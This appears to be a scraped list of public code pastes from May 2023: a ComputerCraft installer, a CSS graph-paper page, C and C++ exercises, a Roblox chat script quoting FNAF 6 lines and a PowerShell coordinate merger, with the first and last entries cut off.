        case '1':
            Laravelnyx()
        case '2':
            check_ssh()
        case _:
            print('{}[{}!{}]{} Wrong Choice..'.format(flc,fr,flc,fw))
            print('{}[{}!{}]{} Redirecting Back to Main'.format(flc,fr,flc,fw))
            time.sleep(2)
            main()
if __name__ == '__main__':
    main()"
mffRc9DY,Setup NAudioSystem,lego11,Lua,Sunday 28th of May 2023 11:52:42 AM CDT,"local maxw, maxh = term.getSize()
function clear()
    term.clear()
    term.setCursorPos(1, 1)
    term.setBackgroundColour(colours.black)
    term.setTextColor(colors.white)
end
function colore(sfumatura) term.setTextColour(sfumatura) end
function fineColore() term.setTextColour(colours.white) end
function sfondo(sfumaturaSfondo) term.setBackgroundColour(sfumaturaSfondo) end
function fineSfondo() term.setBackgroundColour(colours.black) end
 
-- IMPLEMENTAZIONE DEL DRAWFILLEDBOX
local function drawPixelInternal(xPos, yPos)
    term.setCursorPos(xPos, yPos)
    term.write("" "")
end
local tColourLookup = {}
for n = 1, 16 do
    tColourLookup[string.byte(""0123456789abcdef"", n, n)] = 2 ^ (n - 1)
end
function drawFilledBox(startX, startY, endX, endY, nColour)
    if type(startX) ~= ""number"" or type(startX) ~= ""number"" or type(endX) ~=
        ""number"" or type(endY) ~= ""number"" or
        (nColour ~= nil and type(nColour) ~= ""number"") then
        error(""Expected startX, startY, endX, endY, colour"", 2)
    end
 
    startX = math.floor(startX)
    startY = math.floor(startY)
    endX = math.floor(endX)
    endY = math.floor(endY)
 
    if nColour then term.setBackgroundColor(nColour) end
    if startX == endX and startY == endY then
        drawPixelInternal(startX, startY)
        return
    end
 
    local minX = math.min(startX, endX)
    if minX == startX then
        minY = startY
        maxX = endX
        maxY = endY
    else
        minY = endY
        maxX = startX
        maxY = startY
    end
 
    for x = minX, maxX do for y = minY, maxY do drawPixelInternal(x, y) end end
end

function titolo(testo)
    drawFilledBox(1, 1, maxw, 1, colors.red)
    term.setCursorPos((maxw - #testo) / 2, 1)
    colore(colors.white)
    term.write(testo)
    sfondo(colors.blue)
end
while true do
sfondo(colors.blue)
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Si sta eseguendo GEM su questo computer?"")
print(""\n1. Si\n2. No\n"")
local isGem = read()
if isGem == ""1"" then
shell.run(""rm /programs/icons/NPlayer"")
shell.run(""rm /programs/NPlayer"")
shell.run(""pastebin get Ei4HDiwy /programs/icons/NPlayer"")
shell.run(""pastebin get TyTyYRQd /programs/NPlayer"")
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Installazione completata. Rimuovere il disco."")
os.pullEvent(""disk_eject"")
os.reboot()
elseif isGem == ""2"" then
shell.run(""pastebin get TyTyYRQd /NPlayer"")
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Installazione completata.\nPer eseguire N Audio System, digitare nel terminale:\nnplayer\nRimuovere il disco."")
os.pullEvent(""disk_eject"")
os.reboot()
else
clear()
titolo(""Installazione N AUDIO SYSTEM"")
print(""\n\n"")
print(""Scelta non valida"")
sleep(1)
end
end"
7RWeJ9SW,Graph Paper 5/28/23,marshallsmyth,CSS,Sunday 28th of May 2023 11:40:28 AM CDT,"<!DOCTYPE html>   <html>   <head>   <meta name=""viewport"" content=""width=device-width, initial-scale=1""><title>Graph Paper   
 </title><style>@import url(https://fonts.googleapis.com/css?family=Macondo);  ::-webkit-scrollbar { width:16px;height:16px; } 
  ::-webkit-scrollbar-track {background:#006; } ::-webkit-scrollbar-thumb { border-radius:22px;background:#600; } 
 body { background:#100;overflow:auto; }     
 .maintext { text-align:center;font-family:macondo;font-size:22px;color:#f0a;line-height:11px; }       
 .text { position:fixed;top:122px;width:22px;text-align:left;font-family:macondo;font-size:20px;color:green;line-height:44px;margin-top:44px; }
      .falsetext { position:fixed;font-size:1200px;line-height:1100px;color:transparent; }
 
 .row1, .row2, .row3, .row4, .row5, .row6, .row7, .row8, .row9, .row10, .row11, .row12, .row13, .row14, .row15, .row16, .row17, .row18,
 .row19, .row20, .row21, .row22, .row23, .row24, .row25, .row26, .row27, .row28, .row29, .row30, .row31, .row32, .row33, .row34, .row35, .row36,
 .row37, .row38, .row39, .row40, .row41, .row42, .row43, .row44, .row45, .row46, .row47, .row48, .row49, .row50, .row51, .row52, .row53, .row54,
 .row55, .row56, .row57, .row58, .row59, .row60, .row61, .row62, .row63, .row64, .row65, .row66, .row67, .row68, .row69, .row70, .row71, .row72
 { position:fixed;border-left:1px solid gold;top:10px;height:30.5vw; }
 .row1 { left:10px; } .row2 { left:20px; } .row3 { left:30px; } .row4 { left:40px; } .row5 { left:50px; } .row6 { left:60px; } .row7 { left:70px; } 
 .row8 { left:80px; } .row9 { left:90px; } .row10 { left:100px; } .row11 { left:110px; } .row12 { left:120px; } .row13 { left:130px; } .row14 { left:140px; } 
 .row15 { left:150px; } .row16 { left:160px; } .row17 { left:170px; } .row18 { left:180px; } .row19 { left:190px; } .row20 { left:200px; } .row21 { left:210px; } 
 .row22 { left:220px; } .row23 { left:230px; } .row24 { left:240px; } .row25 { left:250px; } .row26 { left:260px; } .row27 { left:270px; } .row28 { left:280px; } 
 .row29 { left:290px; } .row30 { left:300px; } .row31 { left:310px; } .row32 { left:320px; } .row33 { left:330px; } .row34 { left:340px; } .row35 { left:350px; } 
 .row36 { left:360px; } .row37 { left:370px; } .row38 { left:380px; } .row39 { left:390px; } .row40 { left:400px; } .row41 { left:410px; } .row42 { left:420px; } 
 .row43 { left:430px; } .row44 { left:440px; } .row45 { left:450px; } .row46 { left:460px; } .row47 { left:470px; } .row48 { left:480px; } .row49 { left:490px; } 
 .row50 { left:500px; } .row51 { left:510px; } .row52 { left:520px; } .row53 { left:530px; } .row54 { left:540px; } .row55 { left:550px; } .row56 { left:560px; } 
 .row57 { left:570px; } .row58 { left:580px; } .row59 { left:590px; } .row60 { left:600px; } .row61 { left:610px; } .row62 { left:620px; } .row63 { left:630px; } 
 .row64 { left:640px; } .row65 { left:650px; } .row66 { left:660px; } .row67 { left:670px; } .row68 { left:680px; } .row69 { left:690px; } .row70 { left:700px; } 
 .row71 { left:710px; } .row72 { left:720px; } 
 
 .bar1, .bar2, .bar3, .bar4, .bar5, .bar6, .bar7, .bar8, .bar9, .bar10, .bar11, .bar12, .bar13, .bar14, .bar15, .bar16, .bar17, .bar18, .bar19, .bar20, .bar21, 
 .bar22, .bar23, .bar24, .bar25, .bar26, .bar27, .bar28, .bar29, .bar30, .bar31, .bar32, .bar33, .bar34, .bar35, .bar36, .bar37, .bar38, .bar39,  .bar40 
 { position:fixed;border-top:1px solid gold;left:0px;width:100%; }
 .bar1 { top:10px; } .bar2 { top:20px; } .bar3 { top:30px; } .bar4 { top:40px; } .bar5 { top:50px; } .bar6 { top:60px; } .bar7 { top:70px; } 
 .bar8 { top:80px; } .bar9 { top:90px; } .bar10 { top:100px; } .bar11 { top:110px; } .bar12 { top:120px; } .bar13 { top:130px; } .bar14 { top:140px; } 
 .bar15 { top:150px; } .bar16 { top:160px; } .bar17 { top:170px; } .bar18 { top:180px; } .bar19 { top:190px; } .bar20 { top:200px; } .bar21 { top:210px; } 
 .bar22 { top:220px; } .bar23 { top:230px; } .bar24 { top:240px; } .bar25 { top:250px; } .bar26 { top:260px; } .bar27 { top:270px; } .bar28 { top:280px; } 
 .bar29 { top:290px; } .bar30 { top:300px; } .bar31 { top:310px; } .bar32 { top:320px; } .bar33 { top:330px; } .bar34 { top:340px; } 
 .bar35 { top:350px; } .bar36 { top:360px; } .bar37 { top:370px; } .bar38 { top:380px; } .bar39 { top:390px; } .bar40 { top:400px; } 
 
   </style> 
 
 <div class=""row1""></div><div class=""row2""></div><div class=""row3""></div><div class=""row4""></div><div class=""row5""></div>
 <div class=""row6""></div><div class=""row7""></div><div class=""row8""></div><div class=""row9""></div><div class=""row10""></div>
 <div class=""row11""></div><div class=""row12""></div><div class=""row13""></div><div class=""row14""></div><div class=""row15""></div>
 <div class=""row16""></div><div class=""row17""></div><div class=""row18""></div> <div class=""row19""></div><div class=""row20""></div>
 <div class=""row21""></div><div class=""row22""></div><div class=""row23""></div> <div class=""row24""></div><div class=""row25""></div>
 <div class=""row26""></div><div class=""row27""></div><div class=""row28""></div> <div class=""row29""></div><div class=""row30""></div>
 <div class=""row31""></div><div class=""row32""></div><div class=""row33""></div> <div class=""row34""></div><div class=""row35""></div>
 <div class=""row36""></div> <div class=""row37""></div><div class=""row38""></div><div class=""row39""></div><div class=""row40""></div>
 <div class=""row41""></div> <div class=""row42""></div><div class=""row43""></div><div class=""row44""></div><div class=""row45""></div>
 <div class=""row46""></div> <div class=""row47""></div><div class=""row48""></div><div class=""row49""></div><div class=""row50""></div>
 <div class=""row51""></div> <div class=""row52""></div><div class=""row53""></div><div class=""row54""></div> <div class=""row55""></div>
 <div class=""row56""></div><div class=""row57""></div><div class=""row58""></div><div class=""row59""></div> <div class=""row60""></div>
 <div class=""row61""></div><div class=""row62""></div><div class=""row63""></div><div class=""row64""></div> <div class=""row65""></div>
 <div class=""row66""></div><div class=""row67""></div><div class=""row68""></div><div class=""row69""></div> <div class=""row70""></div>
 <div class=""row71""></div><div class=""row72""></div>


<div class=""bar1""></div><div class=""bar2""></div><div class=""bar3""></div>
<div class=""bar4""></div><div class=""bar5""></div><div class=""bar6""></div><div class=""bar7""></div><div class=""bar8""></div>
<div class=""bar9""></div><div class=""bar10""></div><div class=""bar11""></div><div class=""bar12""></div><div class=""bar13""></div>
<div class=""bar14""></div><div class=""bar15""></div><div class=""bar16""></div><div class=""bar17""></div><div class=""bar18""></div>
<div class=""bar19""></div><div class=""bar20""></div><div class=""bar21""></div><div class=""bar22""></div><div class=""bar23""></div>
<div class=""bar24""></div><div class=""bar25""></div><div class=""bar26""></div><div class=""bar27""></div><div class=""bar28""></div>
<div class=""bar29""></div><div class=""bar30""></div><div class=""bar31""></div><div class=""bar32""></div><div class=""bar33""></div>
<div class=""bar34""></div><div class=""bar35""></div><div class=""bar36""></div><div class=""bar37""></div><div class=""bar38""></div>
<div class=""bar39""></div><div class=""bar40""></div>

"
LxcgXZtZ,funny,RobloxingGamerCool,Lua,Sunday 28th of May 2023 11:31:00 AM CDT,x����VJֵ�3��0U�2�Q�S����U�����������������a��RP�PS(P�D�P�(�6V�Z���. ��D�6��D
f3A3RMKw,Notification API Test,ProgrammingPhantom,JSON,Sunday 28th of May 2023 10:53:58 AM CDT,"[
  {
    ""id"": 0,
    ""title"": ""This is the first notification"",
    ""body"": ""This is the body of the first notification.\nMaybe this should be a second line? Not sure :)"",
    ""payload"": """"
  },
  {
    ""id"": 1,
    ""title"": ""Second notification"",
    ""body"": ""This this the second notification."",
    ""payload"": ""Weeoo""
  }
]"
p0FFcsnM,lb4,maxim_shlyahtin,C++,Sunday 28th of May 2023 10:29:29 AM CDT,"class CustomStack {
public:
// конструкторы и деструктор
    CustomStack() {
        mCapacity = 10; // начальная ёмкость стека
        mSize = 0;
        mData = new char *[mCapacity];
    }

    explicit CustomStack(int capacity) {
        mCapacity = capacity;
        mSize = 0;
        mData = new char *[mCapacity];
    }

    ~CustomStack() {
        for (size_t i = 0; i < mSize; ++i) {
            delete[] mData[i];
        }
        delete[] mData;
    }

// методы действий со стеком
    void push(const char *val) {
        if (mSize >= mCapacity) {
            extend(mCapacity); // увеличиваем ёмкость стека при необходимости
        }
        mData[mSize] = new char[strlen(val) + 1];
        strcpy(mData[mSize], val);
        ++mSize;
    }

    void pop() {
        if (!empty()) {
            delete[] mData[mSize - 1];
            --mSize;
        }
    }

    char *top() {
        if (!empty()) {
            return mData[mSize - 1];
        }
        return nullptr;
    }

    size_t size() {
        return mSize;
    }

    bool empty() {
        return mSize == 0;
    }

    void extend(int n) {
        mCapacity += n;
        char **newData = new char *[mCapacity];
        for (size_t i = 0; i < mSize; ++i) {
            newData[i] = mData[i];
        }
        delete[] mData;
        mData = newData;
    }

private:
    size_t mCapacity{}; // максимальная ёмкость стека
    size_t mSize{}; // количество элементов в стеке
protected:
    char **mData; // указатель на массив данных
};

int main() {
    string data;
    getline(cin, data);
    int count_open_tags = 0;
    int count_closing_tags = 0;
    for (int i = 1; i < data.size(); i++) {
        if (data[i - 1] == '<' && data[i] != '/')
            count_open_tags++;
        else if(data[i - 1] == '<' && data[i] == '/')
            count_closing_tags++;
    }
    CustomStack open_tags(count_open_tags);
    for (int i = 0; i < data.size(); i++) {
        char res[10];
        res[0] = '\0';
        if (data[i] == '<'){
            int j = i + 1, n = 0;
            while(data[j] != '>') {
                res[n] = data[j];
                n++; j++;
            }
            res[n] = '\0';
            if(res[0] == '/'){
                char *check = open_tags.top();
                for(int k = 1; res[k]; k++)
                    if(check[k - 1] != res[k]){
                        cout << ""wrong"";
                        return 0;
                    }
                open_tags.pop();
            }
            else if(strcmp(res, ""br"") != 0 && strcmp(res, ""hr"") != 0)
                open_tags.push(res);
            i = j;
        }
    }
    cout << ""correct"";
    return 0;
}"
zgmdWqfD,threeFibers,moldovexc,C,Sunday 28th of May 2023 10:24:17 AM CDT,"#include <ucontext.h>
#include <malloc.h>
#include <stdio.h>
 
#define FIBER_STACK 1024*64
 
ucontext_t uctx_func1,uctx_func2, uctx_func3, uctx_main;
 
void firstFiber(){
    printf(""Fiber1: started\n"");
    printf(""Fiber1: Now swap context to fiber2\n"");
    swapcontext(&uctx_func1, &uctx_func2);
    printf(""Fiber1: returned\n"");
    printf(""Fiber1: Now swap context to fiber2 again\n"");
    swapcontext(&uctx_func1, &uctx_func2);
}
void secondFiber(){
    printf(""Fiber2: started\n"");
    printf(""Fiber2: Now swap context to fiber3\n"");
    swapcontext(&uctx_func2, &uctx_func3);
    printf(""Fiber2: returned\n"");
    printf(""Fiber2: Now swap context to fiber3 again\n"");
    swapcontext(&uctx_func2, &uctx_func3);
 
}
void thirdFiber(){
    printf(""Fiber3: started\n"");
    printf(""Fiber3: Now swap context to fiber1\n"");
    swapcontext(&uctx_func3, &uctx_func1);
    printf(""Fiber3: returned\n"");
    printf(""Fiber3: Now swap context to fiber1 again\n"");
    swapcontext(&uctx_func3, &uctx_main);
}
 
int main(){
    getcontext(&uctx_func1);
    uctx_func1.uc_link = NULL;
    uctx_func1.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func1.uc_stack.ss_size = FIBER_STACK;
    uctx_func1.uc_stack.ss_flags = 0;
    makecontext(&uctx_func1, firstFiber, 0);
    
    getcontext(&uctx_func2);
    uctx_func2.uc_link = NULL;
    uctx_func2.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func2.uc_stack.ss_size = FIBER_STACK;
    uctx_func2.uc_stack.ss_flags = 0;
    makecontext(&uctx_func2, secondFiber, 0);
    
    getcontext(&uctx_func3);
    uctx_func3.uc_link = NULL;
    uctx_func3.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func3.uc_stack.ss_size = FIBER_STACK;
    uctx_func3.uc_stack.ss_flags = 0;
    makecontext(&uctx_func3, thirdFiber, 0);
    
 
    printf(""Main: swap context to fiber1\n"");
    swapcontext(&uctx_main, &uctx_func1);
    
   
 
 
    printf(""Main: returned\n"");
    printf(""Main: exiting\n"");
 
    return 0;
}"
Gkn7VrFy,NEOJ159 有限背包 bitset 優化,penguin71630,C++,Sunday 28th of May 2023 10:21:47 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define fastio ios_base::sync_with_stdio(false); cin.tie(0);
#define endl '\n'
#define _ << ' ' <<

// #pragma GCC optimize(""Ofast"")
// #pragma GCC target(""avx2,tune=native"")
#define siz(x) (int)x.size()
#define print(x) cout << #x << '\t'; for (auto& i : x) cout << i << ' '; cout << '\n'

typedef long long ll;
typedef pair<int, int> pii;
typedef pair<ll, ll> pll;

const int INF = 1e9;
const ll LINF = 1e18;
const ll MOD = 1e9 + 7;
const int maxn = 2e5 + 3;
const int maxc = 1e5 + 1;



int n, m;
bitset<20001> dp;
 
void init() {

    cin >> n >> m;
    dp.reset();
    dp[0] = true;

}



void solve() {

    int ok = false;
    vector<pair<int, int> > C;
    for (int i = 0; i < n; i++) {
        int v, c; cin >> v >> c;
        C.emplace_back(make_pair(v, c));
    }

    for (auto& [v, c] : C) {
        for (int k = 1; k <= c; k <<= 1) {  // 2 進位拆解

            // bitset 優化 0/1 背包
            dp = dp | (dp << (v*k));
            c -= k;

            if (dp[m]) { ok = true; break; }
        }
        if (c) { dp = dp | (dp << (v*c)); }
        if (dp[m]) ok = true;
        if (ok) break;
    }

    cout << (ok ? ""Yes"" : ""No"") << endl;

}

/*




*/


int main() {
    fastio

int T = 1;
cin >> T;
for (int kase = 1; kase <= T; kase++) {
    // cout << ""Case #"" << kase << "": "";
    // n = kase;
    init();
    solve();
}

    return 0;
}"
9V1vY98E,fnaf 6 true end chat messages (real),fred1rick_god,Lua,Sunday 28th of May 2023 10:08:43 AM CDT,"local args = {
    [1] = ""Connection terminated."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""I'm sorry to interupt you, ElizaBeth"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""If you even remenber that name,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""But im afraid you've been misinformed."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""You are not here to receive a gift,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""nor have you been called here by the individual you assume,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""although,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""you have indeed been called."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.2)
local args = {
    [1] = ""You have all been called here,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""into a labyrinth of sounds and smells,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.7)
local args = {
    [1] = ""misdirection and fortune."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.7)
local args = {
    [1] = ""A labyrinth with no exit,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.3)
local args = {
    [1] = ""a maze with no prize."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""You don't even realize that you are trapped."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""Your lust for blood has driven you on endless circles, chasing the cries for children in some unseen chamber,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4.5)
local args = {
    [1] = ""always seeming so near,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""yet somehow out of reach, but you will never find them,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""None of you will. This is where your story ends."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(5)
local args = {
    [1] = ""And to you,my brave volunteer, who somehow found this job listing not intended for you,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4)
local args = {
    [1] = ""although there was a way planned for you,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""I have a feeling that's not what you want."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.3)
local args = {
    [1] = ""I have a feeling that you are right where you want to be."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""I am remaining as well. I am nearby."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3.5)
local args = {
    [1] = ""This place will not be remembered,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""and the memory of everything that started this can finally begin to fade away."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""As the agony of every tragedy should."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4)
local args = {
    [1] = ""And to you monsters trapped in the corridors, be still and give up your spirits. They don't belong to you."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4)
local args = {
    [1] = ""For most of you,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""I belive there is peace and perhaps more waiting for you after the smoke clears."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""Although, for one of you, the darkest pit of Hell has opened to swallow you whole,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""so dont keep the devil waiting,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""old friend."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4.5)
local args = {
    [1] = ""My daughter, if your can hear me, I knew you would return as well."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.8)
local args = {
    [1] = ""It's in your nature to protect the innocent."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""I'm sorry on that day, the day you were shut out and left to die, no one was there to lift you up into their arms the way you lifted others into yours,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3.5)
local args = {
    [1] = ""and then,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""what became of you."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""I should have known you wouldn't be content to disappear, not my daughter."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.8)
local args = {
    [1] = ""I coulden't save you then, so let me save you now."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""It's time to rest - for you, and for"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(1.5)
local args = {
    [1] = ""those you have carried in your arms."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""End communication."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""beep......"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)"
i2bEG6Mu,Дополнение,pasholnahuy,C++,Sunday 28th of May 2023 09:52:14 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <iomanip>
#include <tuple>
#include <map>

using namespace std;

class DSU {
public:
    vector<int> parent;
    vector<int> height;

    DSU(int n) {
        parent.resize(n);
        for (int i = 0; i < n; ++i) {
            parent[i] = i;
        }
        height.assign(n, 0);
    }

    int findRoot(int v) {
        if (v == parent[v]) {
            return v;
        }
        int ans = findRoot(parent[v]);
        parent[v] = ans;
        return ans;
    }

    void Union(int v1, int v2) {
        if (height[v1] >= height[v2]) {
            parent[v2] = v1;
            height[v1] = max(height[v1], height[v2] + 1);
        } else {
            parent[v1] = v2;
            height[v2] = max(height[v2], height[v1] + 1);
        }
    }


};

int main() {
    int n;
    cin >> n;
    vector<pair<double, pair<int, int>>> edges;
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            int t;
            cin >> t;
            edges.push_back({t, {i, j}});
        }
    }
    DSU graph(n);
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            int t;
            cin >> t;
            if (t && graph.findRoot(i) != graph.findRoot(j)){
                graph.Union(i, j);
            }
        }

    }
    sort(edges.begin(), edges.end());
    double ans = 0;
    for (auto [weight, coords]: edges) {
        if (graph.findRoot(coords.first) != graph.findRoot(coords.second)) {
            graph.Union(graph.findRoot(coords.first), graph.findRoot(coords.second));
            ans += weight;
        }
    }
    cout << ans;
    return 0;
};"
JfLUtmgG,GtaIVCoordinateMerger,Plast0000,PowerShell,Sunday 28th of May 2023 09:45:23 AM CDT,"$files = Get-ChildItem -Path ./coordinates/*.ini
$output = ""./group.txt""

if (-not(Test-Path -Path $output -PathType Leaf)) {
    New-Item $output
}

Set-Content $output ""x y z""

foreach($file in $files)
{
    $line = Get-Content $file | select -first 1 -skip 1
    $line = $line.Substring(5)
    Add-Content $output $line
}
"
echHsuse,префиксы,pasholnahuy,C++,Sunday 28th of May 2023 09:36:40 AM CDT,"#include <iostream>
#include <tuple>
#include <random>


using std::pair;
using std::cin;
using std::cout;
using std::vector;
using int64 = int64_t;
using std::max;
using std::min;

int main() {
    std::ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    int n, m;
    cin >> n >> m;
    vector<int64> val(n);
    for (size_t i = 0; i < n; ++i) {
        cin >> val[i];
    }
    vector<int64> pref(n);
    pref[0] = val[0];
    for (int i = 1; i < pref.size(); ++i){
        pref[i] = val[i] + pref[i-1];
    }
    for (size_t i = 0; i < m; ++i){
        int l, r;
        cin >> l >> r, --l, --r;
        if (l == 0){
            cout << pref[r] << '\n';
        } else {
            cout << pref[r] - pref[l-1] << '\n';
        }
